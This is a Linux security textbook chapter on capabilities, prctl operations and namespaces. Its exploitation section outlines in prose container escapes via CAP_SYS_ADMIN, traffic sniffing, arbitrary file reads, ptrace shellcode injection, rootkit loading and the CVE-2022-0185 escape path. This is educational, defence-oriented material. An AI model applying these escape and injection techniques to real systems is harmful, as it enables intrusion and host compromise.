# Domain 2, Chapter 2C — Capabilities, Namespaces, Cgroups, LSMs, and Kernel Memory Security

> **Scope.** The Linux capability system: complete capability enumeration, capability sets (effective, permitted, inheritable, bounding, ambient), and the capability transformation rules across `execve`. The `prctl` security-relevant operations. Namespaces: mount, PID, network, user, UTS, IPC, cgroup, and time. User namespace privilege model and `newuidmap`/`newgidmap`. The `unshare`, `setns`, and `clone` system calls. Cgroups v1 and v2: resource controllers, the freezer, devices, and BPF cgroup controllers. Linux Security Modules: SELinux (type enforcement, MLS, MCS, policy language), AppArmor (profile syntax, `change_hat`, stacking), Smack, TOMOYO, and the LSM hook architecture. eBPF-based LSM programs. Landlock unprivileged sandboxing. The IMA/integrity subsystems. Kernel same-page merging (KSM) and side channels. Memory compression (zswap, zram). Encrypted swap. KFENCE, KASAN, stack protector, and the `pageattr` mechanism.
>
> **Prerequisites.** Chapters 2A (process memory, page tables, KPTI) and 2B (syscall dispatch, seccomp, ptrace). The `task_struct` fields `cred`, `nsproxy`, and `seccomp` introduced in 2A §2.1 are the anchoring points for the material here.

---

## 1. The Linux capability system

### 1.1 Why capabilities exist

The traditional UNIX privilege model is binary: UID 0 can do everything, everyone else is restricted. Capabilities decompose root's power into approximately 40 discrete privileges, each independently grantable. A process that only needs to bind to port 80 can hold `CAP_NET_BIND_SERVICE` without holding `CAP_SYS_ADMIN`, limiting the blast radius of compromise.

The capability system was introduced with POSIX.1e drafts (never ratified as a final standard, but Linux adopted and extended the model). The kernel checks capabilities at every privilege gate: instead of `if (uid == 0)` the check is `if (capable(CAP_XXX))` or `if (ns_capable(ns, CAP_XXX))` for namespace-scoped checks. The `capable()` function consults the calling thread's effective capability set and, if an LSM is active, invokes the `security_capable` hook to allow the LSM to override the decision.

### 1.2 The capability sets and `struct cred`

Each thread carries five capability sets, stored in `struct cred` (defined in `include/linux/cred.h`). The credential structure is reference-counted and copy-on-write: when a thread modifies its capabilities, the kernel allocates a new `struct cred`, copies the old one, applies the modification, and atomically swaps the pointer. This ensures that no other thread observing the old credentials sees a partially-modified state. The relevant fields are:

```c
struct cred {
    /* ... */
    kernel_cap_t    cap_inheritable;  /* caps the task can pass across exec */
    kernel_cap_t    cap_permitted;    /* caps the task is allowed to use */
    kernel_cap_t    cap_effective;    /* caps actually checked by the kernel */
    kernel_cap_t    cap_bset;         /* bounding set — ceiling for gain */
    kernel_cap_t    cap_ambient;      /* ambient — auto-inherited across exec */
    /* ... */
    kuid_t          uid, euid, suid, fsuid;
    kgid_t          gid, egid, sgid, fsgid;
    struct user_namespace *user_ns;   /* namespace these creds are relative to */
    /* ... */
};
```

The `kernel_cap_t` type is a bitmask (currently a 64-bit integer, accommodating up to 64 capabilities). Each bit position corresponds to a `CAP_*` constant.

**Effective (E).** The capabilities actually checked by the kernel when the thread performs a privileged operation. A capability must be in the effective set to grant power. The kernel's `capable()` function tests `cap_raised(current_cred()->cap_effective, cap)`.

**Permitted (P).** The ceiling: the maximum set of capabilities the thread is allowed to hold in its effective set. A thread can raise a capability into its effective set only if it is already in the permitted set. Capabilities can be dropped from the permitted set (irreversibly, without `CAP_SETPCAP`).

**Inheritable (I).** Capabilities that can be passed across `execve` to the new program, provided the new program's file inheritable set also includes them. Used for controlled privilege inheritance in capability-aware programs.

**Bounding set (B).** A hard limit on which capabilities can ever appear in the thread's permitted or inheritable sets. Capabilities dropped from the bounding set (via `prctl(PR_CAPBSET_DROP)`) can never be reacquired, even across `execve` of a setuid-root binary. The bounding set starts full (all capabilities) for init and is inherited across `fork`.

**Ambient (A).** Capabilities that are automatically added to both the permitted and effective sets of a non-setuid, non-file-capability program across `execve`. This solves the problem that non-capability-aware programs (without file capabilities) would lose all capabilities on exec. An ambient capability must be in both P and I to be added to A. Ambient capabilities are cleared on `execve` of a setuid/setgid binary or a binary with file capabilities.

### 1.3 File capabilities

Executable files can carry capability metadata in extended attributes (`security.capability`). Three sets:

- **File permitted (fP)**: capabilities added to the thread's permitted set on exec.
- **File inheritable (fI)**: capabilities that, if also in the thread's inheritable set, are added to the permitted set on exec.
- **File effective (fE)**: a single bit — if set, the thread's effective set is raised to equal its new permitted set on exec. This is the "capability-aware" vs "capability-dumb" distinction: a capability-dumb program (most legacy software) needs fE set so it gets effective capabilities without explicitly raising them.

File capabilities are stored in VFS version 2 or version 3 format. Version 2 (`VFS_CAP_REVISION_2`) stores 32-bit permitted and inheritable masks plus the effective bit. Version 3 (`VFS_CAP_REVISION_3`, introduced for user namespace support) adds a root UID field: the file capabilities are honored only when the execing process's user namespace maps that root UID. This prevents a file with capabilities set by host root from granting capabilities inside an arbitrary user namespace.

### 1.4 The `execve` transformation rules

The `execve` transformation formulas determine how a thread's capability sets change when it calls `execve`. These are the precise rules the kernel applies in `cap_bprm_set_creds()`:

```
new_P = (old_P & fI & old_I) | fP | old_A
new_E = fE ? new_P : old_A
new_I = old_I
new_A = (is_setuid || has_file_caps) ? 0 : old_A
```

If the binary is setuid-root and has no file capabilities, the kernel synthesizes full file capabilities (fP = full, fI = full, fE = 1), emulating the traditional setuid behavior through the capability model. This is how `setuid` binaries gain capabilities even without explicit file capability attributes.

After the transformation, the bounding set is applied as a mask: `new_P &= old_B`. Any capability not in the bounding set is stripped from the new permitted set regardless of the formula above. Then `new_E &= new_P` is enforced (effective cannot exceed permitted).

If `PR_SET_NO_NEW_PRIVS` is set, file capabilities are ignored (no privilege gain across exec). Specifically, the kernel skips the setuid-root synthesis and zeroes fP and fI, so the only capabilities that survive are ambient ones already held.

### 1.5 Complete capability enumeration

The full set as of Linux 6.x (41 capabilities, `CAP_LAST_CAP = 40`). Grouped by function:

**Process and UID management:**

`CAP_SETUID` (7) — Change process UIDs (`setuid`, `setreuid`, `setresuid`), forge UID in SCM_CREDENTIALS ancillary data. Critical: allows escalation to UID 0 if the thread can call `setuid(0)`.

`CAP_SETGID` (6) — Change process GIDs, supplementary groups, forge GID in SCM_CREDENTIALS.

`CAP_SETPCAP` (8) — Add any capability from the bounding set to the inheritable set. Drop capabilities from the bounding set. Transfer capabilities between threads (in older kernels; modern semantics restrict to self).

`CAP_SETFCAP` (31) — Set file capabilities on an executable (write to `security.capability` xattr). Required for `setcap`.

`CAP_KILL` (5) — Bypass permission checks for sending signals. Send any signal to any process regardless of UID.

`CAP_SYS_NICE` (23) — Set real-time scheduling priorities, CPU affinity for arbitrary processes, I/O scheduling class, and `RLIMIT_NICE` ceiling.

`CAP_SYS_RESOURCE` (24) — Override resource limits (`RLIMIT_*`), ext2/3/4 reserved-blocks limit, disk quota limits, `RLIMIT_NPROC` ceiling.

**File and filesystem:**

`CAP_DAC_OVERRIDE` (1) — Bypass read, write, and execute permission checks on files. This is full discretionary access control bypass for regular files.

`CAP_DAC_READ_SEARCH` (2) — Bypass read permission checks on files and read+execute (search) permission on directories. Combined with `CAP_DAC_OVERRIDE`, this is unrestricted filesystem access. Alone, it allows reading any file and traversing any directory — sufficient for data exfiltration.

`CAP_FOWNER` (3) — Bypass permission checks that normally require the process's filesystem UID to match the file's owner UID (e.g., `chmod`, `utime`, extended attribute operations on arbitrary files).

`CAP_FSETID` (4) — Don't clear set-user-ID and set-group-ID bits when a file is modified. Allow setting set-group-ID on a file whose GID doesn't match any group of the process.

`CAP_CHOWN` (0) — Change file ownership (`chown`) without restriction.

`CAP_MKNOD` (27) — Create special files with `mknod()` (device nodes). In a container context, creating device nodes is dangerous if the `devices` cgroup controller doesn't restrict access.

`CAP_LINUX_IMMUTABLE` (9) — Set or clear the `S_IMMUTABLE` and `S_APPEND` inode flags (`chattr +i`, `chattr +a`).

`CAP_LEASE` (28) — Establish file leases on arbitrary files (normally limited to the file owner).

**Networking:**

`CAP_NET_BIND_SERVICE` (10) — Bind to TCP/UDP ports below 1024 (privileged ports). The classic example of least-privilege: a web server needs only this capability, not full root.

`CAP_NET_RAW` (13) — Create raw sockets (`AF_PACKET`, `SOCK_RAW`). Enables network packet capture (sniffing) and injection of crafted packets. Required for `tcpdump`, `ping` (on systems not using `net.ipv4.ping_group_range`). Exploitation: a compromised process with `CAP_NET_RAW` can passively intercept all network traffic on its interfaces, capturing credentials, session tokens, and plaintext data.

`CAP_NET_ADMIN` (12) — Full network administration: configure interfaces, routing tables, iptables/nftables rules, promiscuous mode, multicast, socket options. Modify ARP cache. Within a network namespace, this is scoped to that namespace.

`CAP_NET_BROADCAST` (11) — Send broadcast/multicast packets. This capability is defined in the POSIX.1e draft but is not currently enforced by the Linux kernel — all processes can send broadcast/multicast regardless. It remains reserved for potential future use and is included here for completeness of the enumeration.

**System administration:**

`CAP_SYS_ADMIN` (21) — The "god capability." Gates hundreds of disparate operations: mount/umount filesystems, `pivot_root`, configure kernel parameters (`sysctl`), `quotactl`, `swapon`/`swapoff`, `setns` into most namespace types, `unshare` for mount namespaces, `perf_event_open` (partially split), load BPF programs (partially split), configure cgroups, `keyctl` operations, enable/disable swap, `nfsservctl`, configure inotify limits, access certain `/proc` and `/sys` entries, and much more. Holding `CAP_SYS_ADMIN` is effectively root for most practical purposes. Decomposing workloads to avoid needing it is the central challenge of capability-based hardening.

`CAP_SYS_BOOT` (22) — Call `reboot()`. Allows rebooting or halting the system.

`CAP_SYS_CHROOT` (18) — Call `chroot()`. In containers, this is usually granted because container setup involves `chroot` or `pivot_root`.

`CAP_SYS_MODULE` (16) — Load and unload kernel modules via `init_module`, `finit_module`, `delete_module`. Equivalent to arbitrary kernel code execution. On systems with module signature enforcement (`CONFIG_MODULE_SIG_FORCE`), this capability alone is insufficient — the module must also be validly signed.

`CAP_SYS_RAWIO` (17) — Raw I/O port access (`ioperm`, `iopl`), access to `/dev/mem` and `/dev/kmem` (with `CONFIG_STRICT_DEVMEM` caveats), and SCSI command pass-through. Effectively allows arbitrary physical memory access on systems without `STRICT_DEVMEM`.

`CAP_SYS_PACCT` (20) — Enable/disable process accounting with `acct()`.

`CAP_SYS_TIME` (25) — Set system clock (`settimeofday`, `adjtimex`), set real-time clock.

`CAP_SYS_TTY_CONFIG` (26) — Configure TTY devices: `vhangup()` and certain ioctls on virtual consoles.

**Ptrace and introspection:**

`CAP_SYS_PTRACE` (19) — Allows ptrace of any process (bypassing UID checks and Yama), reading `/proc/PID/mem` of arbitrary processes, and using `process_vm_readv`/`process_vm_writev` across UID boundaries. Also gates `PTRACE_MODE_READ_FSCREDS` checks on `/proc/PID/` entries when Yama scope is >= 1.

`CAP_SYSLOG` (34) — Read kernel log ring buffer (`dmesg`). Separated from `CAP_SYS_ADMIN` because `dmesg` can leak kernel addresses (defeating KASLR). Also controls `klogctl()` and `/proc/kmsg` access.

**Auditing and logging:**

`CAP_AUDIT_CONTROL` (30) — Configure audit subsystem: enable/disable auditing, set audit filter rules, read audit status.

`CAP_AUDIT_READ` (37) — Read audit log via multicast netlink socket.

`CAP_AUDIT_WRITE` (29) — Write records to the kernel audit log. Granted to containers by default in Docker to allow `login`-related PAM audit writes.

**Memory and I/O:**

`CAP_IPC_LOCK` (14) — `mlock`, `mlockall`, `MAP_LOCKED` mappings, and SHM_HUGETLB (huge-page shared memory). Prevents the kernel from swapping out pages, which matters for cryptographic key material that should never touch disk.

`CAP_IPC_OWNER` (15) — Bypass permission checks on System V IPC objects (shared memory, semaphores, message queues).

`CAP_SYS_PERFMON` (38) — Use `perf_event_open` for performance monitoring. Split from `CAP_SYS_ADMIN` in Linux 5.8.

`CAP_BPF` (39) — Load BPF programs (`bpf()` syscall with `BPF_PROG_LOAD`). Split from `CAP_SYS_ADMIN` in Linux 5.8 to allow BPF usage without full admin. Still requires `CAP_PERFMON` for tracing-type BPF programs.

`CAP_CHECKPOINT_RESTORE` (40) — Operations needed by CRIU (Checkpoint/Restore In Userspace): opening `/proc/PID/map_files`, setting process timers, writing to `ns_last_pid`, accessing `PTRACE_MODE_READ` targets. Split from `CAP_SYS_ADMIN` in Linux 5.9.

**Other:**

`CAP_WAKE_ALARM` (35) — Set `CLOCK_REALTIME_ALARM` and `CLOCK_BOOTTIME_ALARM` timers that can wake the system from suspend.

`CAP_BLOCK_SUSPEND` (36) — Employ features that can block system suspend (epoll `EPOLLWAKEUP`, `/dev/wakelock`). Relevant on mobile and embedded platforms where suspend management is security-critical.

`CAP_MAC_OVERRIDE` (32) — Override MAC (LSM) policy. Essentially bypass SELinux/AppArmor/Smack for the holder. Extremely dangerous; not granted by default anywhere. Even most administrative processes should never hold this — policy exceptions should be expressed in the policy itself, not by bypassing the policy engine entirely.

`CAP_MAC_ADMIN` (33) — Configure MAC policy: load SELinux policy modules, modify AppArmor profiles from userspace, manage Smack rules. Required for policy administration but does not bypass policy enforcement. The separation of `MAC_ADMIN` from `MAC_OVERRIDE` ensures that a policy administrator cannot silently exempt themselves from the policy they manage — they can change the rules, but they are still subject to the rules as currently loaded.

### 1.6 Capability exploitation scenarios

**`CAP_SYS_ADMIN` — container escape.** The most common container escape primitive. With `CAP_SYS_ADMIN`, an attacker inside a container can mount the host's filesystem (if the device is accessible), write to cgroup `release_agent`, abuse `unshare` to create new namespaces, or use `nsenter` to enter host namespaces. The canonical exploitation path: mount the host's `/dev/sda1`, find the host's filesystem, write a cron job or SSH key, and escape. This is why Docker strips `CAP_SYS_ADMIN` by default.

**`CAP_NET_RAW` — credential sniffing.** A container granted `CAP_NET_RAW` can open `AF_PACKET` sockets and capture all traffic on its network interface. In bridge-networked container environments where multiple containers share a bridge, this can capture inter-container traffic. Tools like `tcpdump` and `tshark` require only this capability. Mitigation: drop `CAP_NET_RAW` unless the container specifically needs raw socket access.

**`CAP_DAC_READ_SEARCH` — arbitrary file read.** A process with only this capability can read any file on the filesystem regardless of permissions, including `/etc/shadow`, private keys, database files, and secrets mounted from the host. The `open_by_handle_at` syscall (gated by `CAP_DAC_READ_SEARCH`) was the attack primitive in the "Shocker" container escape (CVE-2014-3519): a container with `CAP_DAC_READ_SEARCH` used `open_by_handle_at` to open files on the host filesystem by brute-forcing file handles.

**`CAP_SYS_PTRACE` — process injection.** With `CAP_SYS_PTRACE`, an attacker can ptrace any process on the system (or within the PID namespace), read its memory, inject shellcode, modify registers, and hijack execution. Inside a container, this allows compromising any other process in the same PID namespace. If combined with a shared PID namespace (`--pid=host` in Docker), this is full host compromise. The attack typically uses `PTRACE_POKETEXT` to write shellcode into the target's executable mappings (or `process_vm_writev` for bulk writes), then `PTRACE_SETREGS` to redirect the instruction pointer to the injected code.

**`CAP_SYS_MODULE` — kernel rootkit installation.** A process with `CAP_SYS_MODULE` can load arbitrary kernel modules, which execute at ring 0 with full access to all kernel data structures. A malicious module can hide processes, intercept system calls, modify network traffic, or install persistent backdoors that survive reboots (if the module is placed in the initramfs). The defense is `CONFIG_MODULE_SIG_FORCE` (only cryptographically signed modules can be loaded), `CONFIG_SECURITY_LOCKDOWN_LSM` (restricts module loading in integrity mode), and dropping `CAP_SYS_MODULE` from all containers and non-essential processes.

### 1.7 Tooling and commands

**Inspecting capabilities:**

```bash
# Print current thread's capability sets
capsh --print

# Get capabilities of a specific PID (e.g., current shell)
getpcaps $$

# Decode the hex capability masks from /proc
cat /proc/self/status | grep Cap
# CapInh, CapPrm, CapEff, CapBnd, CapAmb — hex-encoded bitmasks
capsh --decode=00000000a80425fb
```

**Setting file capabilities:**

```bash
# Grant cap_net_raw on a binary (effective + permitted)
setcap cap_net_raw+ep /usr/bin/my_ping

# Grant multiple capabilities
setcap 'cap_net_bind_service,cap_net_raw+ep' /usr/bin/my_server

# View file capabilities
getcap /usr/bin/my_ping

# Remove file capabilities
setcap -r /usr/bin/my_ping

# Recursively find all binaries with file capabilities
getcap -r /usr 2>/dev/null
```

**Container hardening:**

```bash
# Docker: drop all capabilities, add only what's needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE --cap-add=CHOWN myimage

# Kubernetes: SecurityContext in a pod spec
# spec.containers[].securityContext.capabilities.drop: ["ALL"]
# spec.containers[].securityContext.capabilities.add: ["NET_BIND_SERVICE"]
```

### 1.8 Securebits

The securebits flags (controlled via `prctl(PR_SET_SECUREBITS)`) modify the capability inheritance model for UID transitions. They exist to support fully capability-based systems that never rely on UID 0 being special:

`SECBIT_NOROOT` — When set, `execve` of a setuid-root binary does not trigger the special "root gets all capabilities" rule. The binary's file capabilities are still honored, but UID 0 alone is not sufficient to gain capabilities. This flag is essential for building capability-only environments where root is not magical.

`SECBIT_NO_SETUID_FIXUP` — When set, the kernel does not adjust capability sets on `setuid`/`setreuid`/`setresuid` transitions. Normally, transitioning from UID 0 to a non-zero UID clears the effective and permitted sets (for safety); this flag prevents that adjustment.

`SECBIT_KEEP_CAPS` — When set, a thread retains its permitted capabilities when switching from UID 0 to a non-zero UID. This is a legacy mechanism; `NO_SETUID_FIXUP` is the modern replacement. `KEEP_CAPS` is cleared on `execve`.

Each flag has a corresponding `*_LOCKED` variant (e.g., `SECBIT_NOROOT_LOCKED`). Once a `*_LOCKED` bit is set, neither the flag nor the lock can be cleared. This allows a process to permanently commit to a securebits configuration for itself and all descendants.

---

## 2. `prctl` security-relevant operations

`prctl(int option, ...)` is a per-thread control interface. Security-relevant operations:

**`PR_SET_NO_NEW_PRIVS` (38).** Sets a one-way flag: the thread (and its descendants) cannot gain new privileges through `execve` (no setuid, no file capabilities, no capability gain). This flag is required to install seccomp filters without `CAP_SYS_ADMIN`, and is the mechanism that ensures a sandboxed process cannot break out by executing a setuid binary. Once set, it cannot be cleared. The flag is stored in `task_struct->no_new_privs` and checked in `security_bprm_set_creds()`.

**`PR_SET_SECCOMP` (22).** Installs a seccomp filter (equivalent to `seccomp(SECCOMP_SET_MODE_FILTER)` or sets strict mode). Covered in detail in Chapter 2B §3.

**`PR_CAPBSET_DROP` (24).** Drops a capability from the bounding set. Irreversible. Requires `CAP_SETPCAP`.

**`PR_CAPBSET_READ` (23).** Queries whether a capability is in the bounding set. Used by `capsh --print` to enumerate the bounding set.

**`PR_SET_SECUREBITS` (28) / `PR_GET_SECUREBITS` (27).** Set or get the securebits flags described in §1.8 above. Requires `CAP_SETPCAP` to set. Used by capability-aware service managers (e.g., systemd's `SecureBits=` directive) to create environments where UID 0 has no special capability-granting power.

**`PR_CAP_AMBIENT` (47).** Manipulate the ambient capability set. Sub-operations:

- `PR_CAP_AMBIENT_RAISE` — Add a capability to the ambient set. The capability must already be in both the permitted and inheritable sets. This is the mechanism for passing capabilities to non-capability-aware (capability-dumb) child processes across `execve` without requiring file capabilities on the child binary.
- `PR_CAP_AMBIENT_LOWER` — Remove a capability from the ambient set.
- `PR_CAP_AMBIENT_CLEAR_ALL` — Drop all ambient capabilities.
- `PR_CAP_AMBIENT_IS_SET` — Query whether a capability is in the ambient set.

**`PR_SET_DUMPABLE` (4).** Controls whether the process can produce core dumps and whether `/proc/PID/` entries are accessible to other same-UID processes. Setting `PR_SET_DUMPABLE` to 0 tightens the ptrace access checks: the process becomes non-dumpable, and ptrace `PTRACE_MODE_ATTACH` checks fail for non-root tracers. Used by privilege-escalation-sensitive programs (e.g., `sudo`, `su`, `ssh-agent`) to resist ptrace-based credential extraction.

**`PR_SET_NAME` (15).** Changes the thread's `comm` (the name shown in `ps`). Legitimate use by worker threads; also used by malware to disguise itself.

**`PR_SET_PTRACER` (0x59616d61, "Yama").** Declares a specific PID (or `PR_SET_PTRACER_ANY`) as an authorized tracer, overriding Yama scope 1's descendant-only restriction. Used by crash reporters (`google-breakpad`) and by IDEs attaching to their own child processes.

**`PR_SET_CHILD_SUBREAPER` (36).** Makes the calling process the "sub-reaper" for orphaned descendants (they are reparented to it rather than to init). Used by container init processes (PID 1 inside a PID namespace) and by systemd.

**`PR_SET_MM` (35).** Modifies the process's memory-map parameters stored in `mm_struct` (start/end of code, data, stack, brk, and arg/env pointers). Requires `CAP_SYS_RESOURCE`. Used by CRIU during process restore to reconstruct the original memory layout. A process with this capability can manipulate its own `/proc/self/maps` entries, which could be used to confuse security tools that rely on `/proc/PID/maps` for process introspection.

**`PR_SET_TIMERSLACK` (29).** Sets the timer slack value for the calling thread, which controls how much the kernel can coalesce timer wakeups. While not directly security-relevant, extremely tight timer slack (nanosecond precision) can be used by side-channel attacks that require precise timing measurements. Some hardened kernels enforce a minimum timer slack for unprivileged processes.

---

## 3. Namespaces

Namespaces partition kernel resources so that a set of processes sees a private view of a resource while the rest of the system is unaffected. Eight namespace types exist. Each process's namespace membership is stored in `struct nsproxy` (referenced from `task_struct->nsproxy`), which contains pointers to each namespace the process belongs to:

```c
struct nsproxy {
    atomic_t count;
    struct uts_namespace   *uts_ns;
    struct ipc_namespace   *ipc_ns;
    struct mnt_namespace   *mnt_ns;
    struct pid_namespace   *pid_ns_for_children;
    struct net             *net_ns;
    struct time_namespace  *time_ns;
    struct time_namespace  *time_ns_for_children;
    struct cgroup_namespace *cgroup_ns;
};
```

User namespaces are stored separately in `struct cred->user_ns` because they are tied to the credential structure rather than the namespace proxy.

### 3.1 Mount namespace (`CLONE_NEWNS`)

Each mount namespace has its own mount tree (the `struct mnt_namespace` containing a list of `struct mount` entries). A process in one mount namespace can mount and unmount filesystems without affecting processes in other mount namespaces. This is the foundation of container filesystem isolation: the container sees its own root filesystem (a `pivot_root` or `chroot` within its mount namespace) while the host's mounts are invisible.

**`pivot_root` mechanics.** Container runtimes use `pivot_root(new_root, put_old)` rather than `chroot` to change the container's root filesystem. `pivot_root` moves the current root to `put_old` and makes `new_root` the new root. The old root can then be unmounted (`umount -l /put_old`), completely detaching the host filesystem from the container's view. Unlike `chroot` (which only changes the pathname lookup root and can be escaped by a process with `CAP_SYS_CHROOT`), `pivot_root` modifies the mount namespace's root mount, making escape fundamentally harder.

**Container rootfs setup sequence.** A typical container runtime performs the following mount namespace operations in order: (1) `unshare(CLONE_NEWNS)` to enter a new mount namespace; (2) `mount("", "/", NULL, MS_REC|MS_PRIVATE, NULL)` to recursively make the entire mount tree private, preventing any propagation to the host; (3) bind-mount the container's root filesystem image to a staging directory; (4) mount pseudo-filesystems inside the staging directory — `/proc` (type `proc`), `/sys` (bind-mount, usually read-only), `/dev` (minimal `tmpfs` with only necessary device nodes), `/dev/pts`, `/dev/shm`; (5) `pivot_root(staging_dir, staging_dir + "/old_root")` to make the staging directory the new root; (6) `umount2("/old_root", MNT_DETACH)` to lazily unmount the old root, completely severing the container from the host filesystem; (7) `rmdir("/old_root")` to clean up the mount point. This sequence, executed correctly, ensures the container has no reference to the host's mount tree.

**Mount propagation** controls whether mounts in one namespace propagate to peers. Each mount point has a propagation type:

- `shared` — mounts and unmounts propagate to all peers in the same peer group. A mount in namespace A appears in namespace B.
- `private` — no propagation in either direction. This is the default for container mounts.
- `slave` — receives propagation from the master peer group but does not propagate back. The container sees new host mounts but the host does not see container mounts.
- `unbindable` — like private but additionally cannot be bind-mounted. Used to prevent recursive mount accumulation.

Misconfigured propagation is a recurring container escape vector: if a container's mount namespace shares propagation with the host, a mount inside the container can appear on the host. Container runtimes explicitly set `MS_PRIVATE` on the container's rootfs to prevent this.

```bash
# Make a mount point private (no propagation)
mount --make-private /mnt/container

# Make a mount point shared (bidirectional propagation)
mount --make-shared /mnt/container

# Set a mount as slave (receive-only propagation)
mount --make-slave /mnt/container
```

### 3.2 PID namespace (`CLONE_NEWPID`)

Processes inside a PID namespace see their own PID numbering starting from 1. The first process in the namespace is PID 1 (the namespace's init). Processes outside see the namespace's processes by their host-level PIDs. PID namespaces nest: a process has a PID in each level from its namespace up to the root namespace. The mapping is stored in `struct pid`, which contains an array of `struct upid` entries (one per namespace level, each holding the PID number and a pointer to the `pid_namespace`).

PID 1 inside a PID namespace has special responsibilities: it must `wait` on its children (orphaned processes are reparented to it) and it receives `SIGCHLD` for them. If PID 1 exits, the entire namespace is killed (all processes receive `SIGKILL`). This is a critical design point for containers: the container's init process must handle signal reaping properly or the container accumulates zombie processes. Container runtimes typically inject a minimal init (like `tini` or systemd) as PID 1.

Signal handling for PID 1 inside a namespace differs from regular processes: signals from within the namespace are only delivered to PID 1 if PID 1 has registered a handler for them. `SIGKILL` and `SIGSTOP` from within the namespace are ignored (to prevent container processes from killing their own init). However, `SIGKILL` from a parent namespace is always delivered, allowing the host to kill the container's init.

### 3.3 Network namespace (`CLONE_NEWNET`)

Each network namespace has its own network interfaces, routing tables, firewall rules (iptables/nftables), sockets, and `/proc/net`. A newly created network namespace has only a loopback interface (initially down). The kernel's `struct net` represents a network namespace and contains all per-namespace networking state.

**veth pairs** are the standard mechanism for connecting namespaces: one end in the container namespace, the other on the host (typically bridged or routed). Creating a veth pair and moving one end into a namespace:

```bash
# Create veth pair
ip link add veth-host type veth peer name veth-container

# Move one end into the container's network namespace (PID 1234)
ip link set veth-container netns 1234

# Configure from within the container namespace
nsenter -t 1234 -n ip addr add 10.0.0.2/24 dev veth-container
nsenter -t 1234 -n ip link set veth-container up

# Configure the host end
ip addr add 10.0.0.1/24 dev veth-host
ip link set veth-host up
```

Container networking models (Docker bridge, Kubernetes CNI plugins) automate this pattern. The host end typically connects to a Linux bridge or is routed via iptables DNAT/SNAT rules.

Container networking models (Docker bridge, Kubernetes CNI plugins) build on veth pairs. Docker's default bridge mode creates a Linux bridge (`docker0`), attaches the host-side veth end to the bridge, and configures iptables NAT rules so containers can reach the external network via masquerade. Kubernetes CNI plugins (Calico, Cilium, Flannel) use more sophisticated approaches: Calico uses pure L3 routing with BGP, Cilium uses eBPF programs attached to veth endpoints for policy enforcement without iptables. Alternative networking modes include `macvlan` (the container gets a virtual interface with its own MAC address directly on the host's physical network, bypassing the bridge) and `ipvlan` (similar but sharing the host's MAC address).

Security relevance: network namespaces provide network isolation between containers. A container with its own network namespace cannot see or interfere with the host's network stack. However, `CAP_NET_ADMIN` within the namespace grants full control over the namespace's networking — which is safe because it only affects the namespace, not the host. A process that escapes its network namespace (e.g., by entering the host namespace via `setns`) gains visibility and control over the host's entire network stack. Network namespace isolation also means that a container cannot sniff traffic from other containers unless it shares a network namespace or has access to a shared bridge interface with promiscuous mode.

### 3.4 User namespace (`CLONE_NEWUSER`)

The most security-significant namespace type. A user namespace provides an independent mapping of UIDs and GIDs. A process can be UID 0 (root) inside its user namespace while being UID 1000 (unprivileged) on the host. Capabilities are namespace-scoped: `CAP_SYS_ADMIN` inside a user namespace grants admin privilege only within that namespace's domain, not on the host.

An unprivileged user can create a user namespace (this is the only namespace type that can be created without privilege). Inside it, the process has all capabilities in the new namespace. This is the mechanism that enables rootless containers (Podman, rootless Docker): the container process has UID 0 and all capabilities inside its user namespace, but on the host it is an unprivileged user.

**UID/GID mapping:** `/proc/PID/uid_map` and `/proc/PID/gid_map` define the translation. Each line maps a range: `<inside_start> <outside_start> <count>`. Writing to these files requires either `CAP_SETUID`/`CAP_SETGID` in the parent namespace or using the `newuidmap`/`newgidmap` setuid helpers (which enforce the ranges listed in `/etc/subuid` and `/etc/subgid`). The mapping is written exactly once; after the map is set, it cannot be changed. The `deny` keyword can be written to `/proc/PID/setgroups` to disable `setgroups()` in the namespace (required before writing `gid_map` from an unprivileged process, to prevent group privilege escalation).

```bash
# Example: create a user namespace and map UID 0 inside to UID 1000 outside
unshare --user --map-root-user bash
# Inside the new shell: id shows uid=0(root) gid=0(root)
# but on the host, this process runs as the original UID
```

**Security implications:** user namespaces substantially increase kernel attack surface because they expose operations that were previously root-only (mounting filesystems, creating network namespaces, configuring cgroups, etc.) to unprivileged users acting as root inside their namespace. Numerous kernel vulnerabilities have been exploitable only because user namespaces allowed unprivileged access to the vulnerable code path.

CVE-2022-0185 is a textbook example: a heap buffer overflow in the filesystem context parsing code (`legacy_parse_param` in `fs/fs_context.c`) was reachable only by a process with `CAP_SYS_ADMIN` — which an unprivileged user can obtain by creating a user namespace. The overflow allowed controlled heap corruption, leading to arbitrary code execution in kernel context. The exploit created a user namespace, gained `CAP_SYS_ADMIN` within it, triggered the overflow via `fsconfig()`, and escaped to the host. Without user namespaces, the vulnerability would be exploitable only by an already-privileged process.

The sysctl `kernel.unprivileged_userns_clone` (on Debian-derived distributions) or `user.max_user_namespaces` can restrict unprivileged user namespace creation. Ubuntu 24.04+ introduced AppArmor-mediated user namespace restrictions that allow specific programs (Chrome, Firefox, Flatpak) to create user namespaces while denying the general case — a pragmatic middle ground between fully enabling and fully disabling unprivileged user namespaces.

**User namespace interaction with other namespaces.** Creating most other namespace types requires `CAP_SYS_ADMIN` in the current user namespace. But because an unprivileged user can create a user namespace (getting all capabilities within it), they can then create any other namespace type from within. This is the sequence `unshare --user --mount --pid --net` follows: first create the user namespace (gaining capabilities), then create mount/PID/net namespaces using those capabilities. This is by design for rootless containers, but it means the kernel code paths for mount, PID, and network namespace setup are reachable by unprivileged users — a significantly expanded attack surface.

The `user.max_user_namespaces` sysctl (default: a large number, often 65536) limits the total number of user namespaces that can exist system-wide. Setting it to 0 effectively disables unprivileged user namespaces. Per-user limits can also be enforced through `RLIMIT_NPROC` (since namespace creation creates kernel objects counted against the user's resource limits).

### 3.5 UTS namespace (`CLONE_NEWUTS`)

Isolates hostname and NIS domain name. Each UTS namespace has its own `struct uts_namespace` containing the `uname` output fields. Low-security-impact; mainly aesthetic for containers. Modifying the hostname inside a container does not affect the host.

### 3.6 IPC namespace (`CLONE_NEWIPC`)

Isolates System V IPC objects (shared memory segments, message queues, semaphores) and POSIX message queues. Processes in different IPC namespaces cannot access each other's IPC objects. Each IPC namespace has its own `struct ipc_namespace` with independent identifier spaces and limits (`SHMMAX`, `SHMALL`, `MSGMAX`, `MSGMNB`, `SEMMSL`, etc.). This prevents a container from reading shared memory created by the host or another container.

